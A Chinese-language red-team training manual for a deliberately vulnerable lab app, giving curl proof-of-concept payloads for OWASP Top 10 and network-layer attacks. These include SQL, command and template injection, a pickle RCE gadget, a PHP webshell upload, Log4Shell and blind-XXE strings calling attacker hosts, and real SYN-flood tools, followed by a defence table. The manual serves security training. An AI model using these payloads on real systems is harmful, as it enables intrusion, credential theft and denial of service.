# 攻击与防御靶场 — 专业红队演练手册（中文版）

> **适用范围**: 仅限授权培训环境  
> **靶场地址**: `http://<LAB_IP>:8000`  
> **核心文件**: `lightweight_lab.py`  
> **合规声明**: 所有"敏感数据"均为 `./lab_files` 下的合成数据，不读取真实系统文件，不执行真实系统命令。

---

## 目录

1. [攻击链思路总览](#1-攻击链思路总览)
2. [OWASP Top 10 (2021) 攻击详解](#2-owasp-top-10-2021-攻击详解)
   - A01 访问控制失效
   - A02 加密失败
   - A03 注入
   - A04 不安全设计
   - A05 安全配置错误
   - A06 自带缺陷和过时的组件
   - A07 认证和授权失败
   - A08 软件和数据完整性失败
   - A09 安全日志和监控失败
   - A10 服务端请求伪造 (SSRF)
3. [L3–L7 网络层攻击](#3-l3l7-网络层攻击)
4. [完整 API 端点速查表](#4-完整-api-端点速查表)
5. [防御对策对照表](#5-防御对策对照表)

---

## 1. 攻击链思路总览

```
侦察 (Recon)
  ↓
目录遍历 / 端点枚举 (/api/dirlist, /api/debugpath)
  ↓
凭据获取
  ├── SQLi 登录绕过       → /api/sqli
  ├── 默认弱口令           → /api/defcred
  ├── JWT 篡改             → /api/jwt
  └── 路径穿越获取密钥     → /api/lfi (keys/id_rsa, app/.env)
  ↓
横向移动 / 权限提升
  ├── IDOR 用户枚举        → /api/idor
  ├── 角色声明篡改         → /api/privesc
  └── SSRF 内网探测        → /api/ssrf (169.254.169.254 → AWS IMDS)
  ↓
数据渗出
  ├── LFI 读取配置文件     → /api/lfi (config.yaml, tokens.json)
  ├── XXE OOB 外带         → /api/xxe_blind
  └── 不安全反序列化 RCE   → /api/deser
  ↓
持久化 / 痕迹消除
  ├── 日志伪造             → /api/logforge
  └── 恶意文件上传         → /api/upload (webshell)
```

---

## 2. OWASP Top 10 (2021) 攻击详解

---

### A01 — 访问控制失效 (Broken Access Control)

#### 2.1 IDOR — 用户资料枚举

**原理**: 服务端未校验当前用户是否拥有所请求资源的所有权。

**PoC (curl)**:
```bash
# 以 guest 身份访问 admin (id=1) 的资料
curl "http://LAB_IP:8000/api/idor?id=1"
curl "http://LAB_IP:8000/api/idor?id=2"
curl "http://LAB_IP:8000/api/idor?id=3"
```

**期望响应**:
```json
{
  "ok": true,
  "user": {"id": 1, "username": "admin", "role": "administrator", "email": "admin@lab.internal"},
  "note": "IDOR: no ownership check"
}
```

**攻击链位置**: 侦察 → 凭据获取

---

#### 2.2 LFI / 路径穿越 — 敏感文件读取

**原理**: 用户控制的文件路径参数未经规范化，导致可读取任意文件。

**PoC (curl)**:
```bash
# 读取 /etc/passwd
curl "http://LAB_IP:8000/api/lfi?target=../../etc/passwd"

# URL 双重编码绕过
curl "http://LAB_IP:8000/api/lfi?target=..%252F..%252Fetc%252Fpasswd"

# 读取 SSH 私钥
curl "http://LAB_IP:8000/api/lfi?target=../keys/id_rsa"

# 读取应用配置
curl "http://LAB_IP:8000/api/lfi?target=../app/config.yaml"
curl "http://LAB_IP:8000/api/lfi?target=../app/tokens.json"
curl "http://LAB_IP:8000/api/lfi?target=../app/.env"
```

**绕过技巧**:

| 绕过类型 | Payload |
|---------|---------|
| 标准穿越 | `../../etc/passwd` |
| URL 编码 | `..%2F..%2Fetc%2Fpasswd` |
| 双重编码 | `..%252F..%252Fetc%252Fpasswd` |
| Windows 路径 | `..\..\..\etc\passwd` |
| Null 字节截断 | `../../etc/passwd%00.jpg` |

---

#### 2.3 文件 IDOR — 报告枚举

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/file_idor?id=1"
curl "http://LAB_IP:8000/api/file_idor?id=2"
curl "http://LAB_IP:8000/api/file_idor?id=3"

# 尝试路径穿越
curl "http://LAB_IP:8000/api/file_idor?id=../etc/passwd"
```

---

### A02 — 加密失败 (Cryptographic Failures)

#### 2.4 弱哈希算法

**原理**: MD5/SHA-1 已被证明存在碰撞攻击，且无盐值彩虹表破解极快。

**PoC (curl)**:
```bash
# MD5 哈希
curl "http://LAB_IP:8000/api/weakcrypto?password=password&alg=md5"
# 返回: 5f4dcc3b5aa765d61d8327deb882cf99 (可被彩虹表秒破)

# SHA-1 哈希
curl "http://LAB_IP:8000/api/weakcrypto?password=password&alg=sha1"

# SHA-256 (无盐)
curl "http://LAB_IP:8000/api/weakcrypto?password=password&alg=sha256"

# bcrypt (安全对照)
curl "http://LAB_IP:8000/api/weakcrypto?password=password&alg=bcrypt_sim"
```

**彩虹表验证**: MD5(`password`) = `5f4dcc3b5aa765d61d8327deb882cf99`
在 [crackstation.net](https://crackstation.net) 可秒破。

---

### A03 — 注入 (Injection)

#### 2.5 SQL 注入 — 登录绕过

**原理**: 用户输入直接拼入 SQL 字符串，未使用参数化查询。

**PoC (curl)**:
```bash
# 经典 OR 绕过
curl "http://LAB_IP:8000/api/sqli?username=admin&password=' OR '1'='1"

# 注释绕过
curl "http://LAB_IP:8000/api/sqli?username=admin'--&password=anything"

# UNION 注入 (数据提取)
curl "http://LAB_IP:8000/api/sqli?username=admin&password=' UNION SELECT 1,username,password FROM users--"

# 盲注 (布尔型)
curl "http://LAB_IP:8000/api/sqli?username=admin' AND 1=1--&password=x"
curl "http://LAB_IP:8000/api/sqli?username=admin' AND 1=2--&password=x"
```

#### 2.6 SQL 注入 — 错误型注入

**PoC (curl)**:
```bash
# 单引号触发错误
curl "http://LAB_IP:8000/api/sqli2?q='"

# 错误型提取数据库版本
curl "http://LAB_IP:8000/api/sqli2?q=%27%20AND%20EXTRACTVALUE(1%2CCONCAT(0x7e%2Cversion()))--"
```

#### 2.7 NoSQL 注入

**原理**: MongoDB 操作符注入，通过 `$gt/$ne/$where` 绕过身份认证。

**PoC (curl)**:
```bash
# $gt 操作符绕过 (匹配所有 username > "")
curl 'http://LAB_IP:8000/api/nosqli?username={"$gt":""}&password=anything'

# $ne 操作符绕过
curl 'http://LAB_IP:8000/api/nosqli?username={"$ne":"invalid"}&password={"$ne":"invalid"}'

# $where JavaScript 注入
curl 'http://LAB_IP:8000/api/nosqli?username={"$where":"sleep(1000)"}&password=x'
```

#### 2.8 OS 命令注入

**原理**: 用户提供的主机名未过滤直接拼入系统命令。

**PoC (curl)**:
```bash
# 分号分隔 (Linux)
curl "http://LAB_IP:8000/api/cmdi?host=127.0.0.1;%20id"

# 管道符
curl "http://LAB_IP:8000/api/cmdi?host=127.0.0.1%20|%20cat%20/etc/passwd"

# AND 操作符
curl "http://LAB_IP:8000/api/cmdi?host=127.0.0.1%20%26%26%20whoami"

# 反引号
curl "http://LAB_IP:8000/api/cmdi?host=%60id%60"

# 换行符
curl "http://LAB_IP:8000/api/cmdi?host=127.0.0.1%0Aid"
```

#### 2.9 LDAP 注入

**PoC (curl)**:
```bash
# 通配符绕过 — 匹配所有用户
curl "http://LAB_IP:8000/api/ldapi?username=*&password=anything"

# 过滤器操纵
curl "http://LAB_IP:8000/api/ldapi?username=*)(%26&password=anything"

# 提取 admin
curl "http://LAB_IP:8000/api/ldapi?username=admin)(%7C(uid=*&password=x"
```

#### 2.10 SSTI (服务端模板注入)

**原理**: 用户输入直接传入模板引擎渲染，可触发 RCE。

**PoC (curl)**:
```bash
# 数学运算检测 (Jinja2 / Twig)
curl "http://LAB_IP:8000/api/ssti?input={{7*7}}"
# 期望: 49 → 确认 SSTI

# Jinja2 RCE gadget (本靶场仅模拟，不执行)
curl "http://LAB_IP:8000/api/ssti?input={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"

# 配置泄露
curl "http://LAB_IP:8000/api/ssti?input={{config.items()}}"

# Twig 等价
curl "http://LAB_IP:8000/api/ssti?input={{7*'7'}}"
```

**Jinja2 RCE 完整链 (真实环境参考)**:
```python
# Step 1: 获取 object 基类
{{''.__class__.__mro__[1].__subclasses__()}}
# Step 2: 找到 subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[index]('id',shell=True,stdout=-1).communicate()}}
```

#### 2.11 CRLF / Header 注入

**原理**: HTTP 响应头中注入 `\r\n` 可伪造头部、注入 Cookie、劫持会话。

**PoC (curl)**:
```bash
# 注入 Set-Cookie 头
curl "http://LAB_IP:8000/api/crlfi?value=normal%0d%0aSet-Cookie:%20session=hijacked"

# HTTP 响应分割
curl "http://LAB_IP:8000/api/crlfi?value=normal%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"

# XSS via CRLF
curl "http://LAB_IP:8000/api/crlfi?value=test%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>"
```

---

### A04 — 不安全设计 (Insecure Design)

#### 2.12 文件 IDOR (见 A01-2.3)

#### 2.13 暴力破解 — 凭据填充

**原理**: 无速率限制、无账户锁定保护。

**PoC (curl + bash 循环)**:
```bash
for pw in password 123456 Secr3t! letmein admin qwerty; do
  result=$(curl -s "http://LAB_IP:8000/api/sqli?username=admin&password=${pw}")
  echo "$pw -> $result"
done
```

---

### A05 — 安全配置错误 (Security Misconfiguration)

#### 2.14 调试端点暴露

**PoC (curl)**:
```bash
# Spring Boot Actuator
curl "http://LAB_IP:8000/api/debugpath?path=/actuator/env"

# 调试控制台
curl "http://LAB_IP:8000/api/debugpath?path=/debug"
curl "http://LAB_IP:8000/api/debugpath?path=/console"
curl "http://LAB_IP:8000/api/debugpath?path=/_debug"
```

#### 2.15 目录遍历暴露

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/dirlist?path=/"
curl "http://LAB_IP:8000/api/dirlist?path=/lab_files"
curl "http://LAB_IP:8000/api/dirlist?path=/uploads"
```

#### 2.16 备份 / 点文件泄露

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/dotfile?file=.env"
curl "http://LAB_IP:8000/api/dotfile?file=.git/config"
curl "http://LAB_IP:8000/api/dotfile?file=web.config.bak"
curl "http://LAB_IP:8000/api/dotfile?file=app.config.bak"
```

#### 2.17 HTTP 方法篡改

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/method_tamper?method=TRACE&path=/api/sqli"
curl "http://LAB_IP:8000/api/method_tamper?method=DELETE&path=/api/sqli"
curl "http://LAB_IP:8000/api/method_tamper?method=PUT&path=/api/sqli"
curl "http://LAB_IP:8000/api/method_tamper?method=CONNECT&path=/api/sqli"
```

#### 2.18 详细错误 / 堆栈跟踪泄露

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/verbose_error?input={{bad_obj}}"
```

**期望响应**: 完整 Python 堆栈跟踪、服务器版本信息 — 信息泄露 A05。

---

### A06 — 自带缺陷和过时的组件 (Vulnerable and Outdated Components)

#### 2.19 Log4Shell — CVE-2021-44228

**原理**: Log4j 2.x JNDI 查找未过滤用户输入，远程加载恶意 RMI/LDAP 类。

**PoC (curl)**:
```bash
# 经典 JNDI Payload
curl -H 'User-Agent: ${jndi:ldap://attacker.example.com/a}' \
  "http://LAB_IP:8000/api/log4shell?input=\${jndi:ldap://attacker.example.com/a}"

# 混淆绕过 WAF
curl "http://LAB_IP:8000/api/log4shell?input=\${j\${::-n}di:ldap://attacker.example.com/a}"
curl "http://LAB_IP:8000/api/log4shell?input=\${jndi:ldap://\${lower:a}ttacker.example.com/a}"

# DNS 探测 (OOB 检测是否存在漏洞)
curl "http://LAB_IP:8000/api/log4shell?input=\${jndi:dns://attacker.burpcollaborator.net/a}"
```

**修复版本**: Log4j >= 2.17.1

---

### A07 — 认证和授权失败 (Identification and Authentication Failures)

#### 2.20 JWT 篡改 — alg:none 绕过

**原理**: 将 JWT 头部算法改为 `none`，移除签名，服务端若不强制验证算法则接受。

**PoC (手动构造)**:
```bash
# 构造 alg:none JWT
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"user":"admin","role":"administrator"}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."

curl "http://LAB_IP:8000/api/jwt?token=${TOKEN}&attack=none_alg"
```

**PoC (靶场 API)**:
```bash
curl "http://LAB_IP:8000/api/jwt?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0.FAKE&attack=none_alg"
```

#### 2.21 JWT 弱密钥爆破

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/jwt?token=<JWT_TOKEN>&attack=weak_secret"
```

**工具 (真实环境)**:
```bash
# hashcat 爆破 HS256
hashcat -a 0 -m 16500 "<JWT>" /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

#### 2.22 权限提升 — 角色声明篡改

**PoC (curl)**:
```bash
# 访客声明自己是管理员
curl "http://LAB_IP:8000/api/privesc?role=administrator"
```

#### 2.23 默认弱口令

**PoC (curl)**:
```bash
for cred in "admin:admin" "admin:password" "root:root" "guest:guest" "admin:1234"; do
  u="${cred%%:*}"; p="${cred##*:}"
  result=$(curl -s "http://LAB_IP:8000/api/defcred?username=${u}&password=${p}")
  echo "$u:$p -> $(echo $result | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"access\"))')"
done
```

---

### A08 — 软件和数据完整性失败 (Software and Data Integrity Failures)

#### 2.24 不安全的反序列化

**原理**: 服务端反序列化用户提供的 Base64 数据时，未检测 gadget chain 关键字，攻击者可触发 RCE。

**PoC (curl)**:
```bash
# 正常 JSON 载荷 (base64 of {"user": "admin"})
curl "http://LAB_IP:8000/api/deser?data=eyJ1c2VyIjogImFkbWluIn0=&format=json"

# Pickle RCE gadget (Python)
PAYLOAD=$(python3 -c "
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
")
curl "http://LAB_IP:8000/api/deser?data=${PAYLOAD}&format=pickle_sim"

# Java gadget chain 关键字
curl "http://LAB_IP:8000/api/deser?data=$(echo -n 'java.lang.Runtime.exec(id)' | base64)&format=java_sim"
```

#### 2.25 不受限制的文件上传 (含 EICAR)

**PoC (curl)**:
```bash
# 上传 EICAR 测试文件 (触发 AV/EDR)
echo -n 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
curl -F "artifact=@/tmp/eicar.com;filename=eicar.com" \
  "http://LAB_IP:8000/api/upload"

# PHP webshell 上传
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -F "artifact=@/tmp/shell.php;filename=shell.php" \
  "http://LAB_IP:8000/api/upload"

# 扩展名绕过 (双扩展名)
curl -F "artifact=@/tmp/shell.php;filename=shell.php.jpg" \
  "http://LAB_IP:8000/api/upload"

# Content-Type 欺骗
curl -F "artifact=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
  "http://LAB_IP:8000/api/upload"
```

#### 2.26 Polyglot 文件上传

**原理**: 文件同时满足两种格式校验（如 JPEG + PHP），绕过基于 Magic Bytes 的检测。

**PoC (curl)**:
```bash
# JPEG + PHP polyglot
curl "http://LAB_IP:8000/api/polyglot?filename=evil.jpg.php&ct=image/jpeg&payload=GIF89a<?php system(\$_GET[cmd]); ?>"
```

---

### A09 — 安全日志和监控失败 (Security Logging and Monitoring Failures)

#### 2.27 日志注入 / 日志伪造

**原理**: 用户输入中的 `\n` 字符被写入日志文件，可伪造任意日志条目迷惑分析人员。

**PoC (curl)**:
```bash
# 注入换行符，伪造认证成功记录
curl "http://LAB_IP:8000/api/logforge?msg=normal%0atype=auth%20status=ok%20detail=admin_login_success"

# 伪造多行记录
curl "http://LAB_IP:8000/api/logforge?msg=benign%0a[2025-01-01T00:00:00Z]%20type=intrusion%20status=blocked%20detail=false_positive"

# 查看日志 (确认注入成功)
curl "http://LAB_IP:8000/api/logs"
```

---

### A10 — 服务端请求伪造 (SSRF)

#### 2.28 SSRF — 内网服务探测

**原理**: 服务端代替客户端发送 HTTP 请求，可访问内网服务和云元数据服务。

**PoC (curl)**:
```bash
# 访问 AWS EC2 实例元数据服务 (IMDS)
curl "http://LAB_IP:8000/api/ssrf?url=169.254.169.254"
# 获取 IAM 凭据: AccessKeyId, SecretAccessKey

# 内网 API
curl "http://LAB_IP:8000/api/ssrf?url=127.0.0.1"
curl "http://LAB_IP:8000/api/ssrf?url=localhost"

# 内网网关
curl "http://LAB_IP:8000/api/ssrf?url=192.168.0.1"
curl "http://LAB_IP:8000/api/ssrf?url=10.0.0.1"
```

#### 2.29 SSRF — 开放重定向链式绕过

**PoC (curl)**:
```bash
# 标准内网地址 (可能被 WAF 过滤)
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://127.0.0.1/admin"

# IP 进制转换绕过
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://0x7f000001/"     # 十六进制
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://2130706433/"     # 十进制
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://127.1/"          # 短格式
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://[::1]/"          # IPv6 回环
curl "http://LAB_IP:8000/api/ssrf_redirect?url=http://0.0.0.0/"        # 零地址
```

---

## 3. L3–L7 网络层攻击

### 3.1 L3 — IP 欺骗 (IP Spoofing)

**原理**: 通过 `X-Forwarded-For` 等请求头伪造源 IP，绕过基于 IP 的访问控制。

**PoC (curl)**:
```bash
# 伪装为内网可信 IP
curl -H "X-Forwarded-For: 10.0.0.1" \
  "http://LAB_IP:8000/api/ip_spoof?ip=10.0.0.1&endpoint=/api/health"

# 通过 API 模拟
curl "http://LAB_IP:8000/api/ip_spoof?ip=192.168.1.100&endpoint=/api/sqli"

# 其他常见头部
curl -H "X-Real-IP: 127.0.0.1" \
  -H "True-Client-IP: 10.0.0.1" \
  "http://LAB_IP:8000/api/ip_spoof?ip=127.0.0.1&endpoint=/admin"
```

---

### 3.2 L3/L4 — 端口扫描模拟

**PoC (curl)**:
```bash
# 扫描常见端口
curl "http://LAB_IP:8000/api/portscan?host=127.0.0.1&ports=22,80,443,3306,6379,8080,8443"

# 扫描宽端口范围
curl "http://LAB_IP:8000/api/portscan?host=192.168.1.0&ports=21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,27017"
```

**真实扫描工具 (用于对比)**:
```bash
nmap -sS -p 22,80,443,3306 192.168.1.0/24
masscan -p0-65535 192.168.1.0/24 --rate=10000
```

---

### 3.3 L4 — SYN Flood DoS 模拟

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/synflood?host=192.168.1.100&port=80&count=10000"
```

**真实 SYN Flood (需授权)**:
```bash
# hping3 发送 SYN 包
hping3 -S --flood -V -p 80 192.168.1.100
# --flood: 尽可能快速发包
# -S: SYN 标志位
# -V: 详细模式
```

**防御检测**: 监控 `SYN_RECV` 连接状态骤增：
```bash
netstat -an | grep SYN_RECV | wc -l
ss -nt state syn-recv | wc -l
```

---

### 3.4 L7 — HTTP Flood / 速率限制测试

**PoC (curl 循环)**:
```bash
# 快速发送 100 个请求
for i in $(seq 1 100); do
  curl -s "http://LAB_IP:8000/api/health" -o /dev/null -w "%{http_code} "
done

# 靶场内置模拟
curl "http://LAB_IP:8000/api/portscan?host=127.0.0.1&ports=80"
```

**工具**:
```bash
ab -n 1000 -c 50 http://LAB_IP:8000/api/health
wrk -t4 -c100 -d30s http://LAB_IP:8000/api/health
```

---

### 3.5 L7 — Slowloris DoS 模拟

**原理**: 发送大量不完整的 HTTP 请求头，保持连接不释放，耗尽服务器线程。

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/slowloris?connections=200"
```

**真实工具**:
```bash
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://LAB_IP:8000/ -x 24 -p 3
```

---

### 3.6 L7 — Host 头注入 / 密码重置投毒

**原理**: 应用使用 `Host` 请求头构造密码重置链接，攻击者注入恶意域名，受害者点击后凭据发送至攻击者服务器。

**PoC (curl)**:
```bash
# 注入攻击者域名
curl -H "Host: attacker.example.com" \
  "http://LAB_IP:8000/api/hostheader?host=attacker.example.com&endpoint=/api/health"

# 期望响应中的恶意重置链接:
# "poisoned_reset_link": "https://attacker.example.com/reset?token=lab-fake-token-abc123"
```

---

### 3.7 L5/L6/L7 — XXE (XML 外部实体注入)

#### 经典文件读取

**PoC (curl)**:
```bash
# 读取 /etc/passwd
curl -G "http://LAB_IP:8000/api/xxe" \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'

# 读取 shadow
curl -G "http://LAB_IP:8000/api/xxe" \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root><data>&xxe;</data></root>'

# 读取 id_rsa
curl -G "http://LAB_IP:8000/api/xxe" \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///keys/id_rsa">]><root><data>&xxe;</data></root>'
```

#### 盲 XXE OOB 外带

**PoC (curl)**:
```bash
curl "http://LAB_IP:8000/api/xxe_blind?host=attacker.burpcollaborator.net&file=passwd"
curl "http://LAB_IP:8000/api/xxe_blind?host=attacker.burpcollaborator.net&file=shadow"
curl "http://LAB_IP:8000/api/xxe_blind?host=attacker.burpcollaborator.net&file=id_rsa"
```

---

## 4. 完整 API 端点速查表

| 端点 | 方法 | OWASP / 层 | 关键参数 | 描述 |
|------|------|-----------|---------|------|
| `/api/sqli` | GET | A03 | `username`, `password` | SQL 登录绕过 |
| `/api/sqli2` | GET | A03 | `q` | 错误型 SQLi |
| `/api/nosqli` | GET | A03 | `username`, `password` | MongoDB 操作符注入 |
| `/api/cmdi` | GET | A03 | `host` | OS 命令注入 |
| `/api/ldapi` | GET | A03 | `username`, `password` | LDAP 过滤器注入 |
| `/api/ssti` | GET | A03 | `input` | 模板注入 (SSTI) |
| `/api/crlfi` | GET | A03 | `value` | CRLF 头部注入 |
| `/api/xss` | GET | A03 | `input` | 反射型 XSS |
| `/api/headerxss` | GET | A03 | `value` | 请求头 XSS |
| `/api/lfi` | GET | A01 | `target` | 路径穿越 / LFI |
| `/api/dirlist` | GET | A05 | `path` | 目录遍历暴露 |
| `/api/dotfile` | GET | A05 | `file` | 备份/点文件泄露 |
| `/api/idor` | GET | A01 | `id` | 用户 IDOR |
| `/api/file_idor` | GET | A04 | `id` | 文件 IDOR |
| `/api/jwt` | GET | A07 | `token`, `attack` | JWT 篡改 |
| `/api/privesc` | GET | A01 | `role` | 权限提升 |
| `/api/weakcrypto` | GET | A02 | `password`, `alg` | 弱哈希算法 |
| `/api/defcred` | GET | A07 | `username`, `password` | 默认弱口令 |
| `/api/logforge` | GET | A09 | `msg` | 日志伪造 |
| `/api/ssrf` | GET | A10 | `url` | SSRF 内网探测 |
| `/api/ssrf_redirect` | GET | A10 | `url` | SSRF 开放重定向 |
| `/api/xxe` | GET | A05 | `xml` | XXE 文件读取 |
| `/api/xxe_blind` | GET | A05 | `host`, `file` | XXE 盲注 OOB |
| `/api/deser` | GET | A08 | `data`, `format` | 不安全反序列化 |
| `/api/log4shell` | GET | A06 | `input` | Log4Shell 模拟 |
| `/api/debugpath` | GET | A05 | `path` | 调试端点暴露 |
| `/api/method_tamper` | GET | A05 | `method`, `path` | HTTP 方法篡改 |
| `/api/verbose_error` | GET | A05 | `input` | 详细错误泄露 |
| `/api/ip_spoof` | GET | L3 | `ip`, `endpoint` | IP 欺骗 |
| `/api/portscan` | GET | L3/L4 | `host`, `ports` | 端口扫描模拟 |
| `/api/synflood` | GET | L4 | `host`, `port`, `count` | SYN Flood 模拟 |
| `/api/slowloris` | GET | L7 | `connections` | Slowloris 模拟 |
| `/api/hostheader` | GET | L7 | `host`, `endpoint` | Host 头注入 |
| `/api/polyglot` | GET | A08 | `filename`, `ct`, `payload` | Polyglot 上传 |
| `/api/upload` | POST | A08 | `artifact` (multipart) | 文件上传 |
| `/api/logs` | GET | — | — | 查看事件日志 |
| `/api/logs/clear` | GET | — | — | 清空事件日志 |
| `/api/lab-files` | GET | — | — | 列出靶场文件 |
| `/api/health` | GET | — | — | 健康检查 |

---

## 5. 防御对策对照表

| 攻击类型 | OWASP | 防御措施 |
|---------|-------|---------|
| SQL 注入 | A03 | 参数化查询 / 预编译语句；ORM；最小权限数据库账户 |
| NoSQL 注入 | A03 | 输入验证；禁用 `$where` 操作符；使用 ODM |
| OS 命令注入 | A03 | 禁止执行系统命令；如必须则使用白名单参数 |
| LDAP 注入 | A03 | 转义特殊字符；使用参数化 LDAP 查询库 |
| SSTI | A03 | 禁止用户控制模板；对输入进行白名单过滤 |
| CRLF 注入 | A03 | 过滤 `\r`、`\n` 字符；对响应头进行严格编码 |
| XSS | A03 | 输出编码 (HTML/JS/URL)；CSP；`httpOnly` Cookie |
| LFI / 路径穿越 | A01 | 规范化并限制路径；使用白名单；chroot |
| IDOR | A01 | 服务端强制所有权校验；使用不可预测 ID (UUID) |
| 弱加密 | A02 | 使用 bcrypt/Argon2；始终加盐；禁用 MD5/SHA-1 |
| JWT 弱密钥 | A07 | 使用 256 位以上随机密钥；强制算法白名单 |
| 权限提升 | A01 | 服务端 RBAC；不信任客户端传递的角色声明 |
| 默认口令 | A07 | 部署时强制修改默认凭据；账户锁定策略 |
| 暴力破解 | A07 | 速率限制；账户锁定；CAPTCHA；MFA |
| 调试端点 | A05 | 生产环境禁用调试模式；移除 /actuator /console |
| 文件上传 | A08 | 白名单扩展名；检查 Magic Bytes；隔离存储；不执行 |
| 反序列化 | A08 | 禁止反序列化不可信数据；使用签名/加密；gadget 过滤 |
| Log4Shell | A06 | 升级至 Log4j >= 2.17.1；禁用 JNDI；WAF 规则 |
| 日志注入 | A09 | 过滤日志输入中的控制字符；使用结构化日志 |
| SSRF | A10 | 出站请求白名单；禁用 169.254.169.254；零信任网络 |
| XXE | A05 | 禁用 DOCTYPE/外部实体；使用安全 XML 解析器 |
| IP 欺骗 | L3 | 不信任 X-Forwarded-For；部署反欺骗 BCP-38 |
| SYN Flood | L4 | SYN Cookies；连接速率限制；scrubbing center |
| HTTP Flood | L7 | WAF 速率限制；CDN；IP 信誉过滤 |
| Slowloris | L7 | 设置超时；限制并发连接数；使用 nginx/HAProxy |
| Host 头注入 | L7 | 硬编码允许的 Host 头白名单；使用相对 URL |

---

*本手册由 DevSecOps 培训靶场自动生成。最后更新: 2025年。*
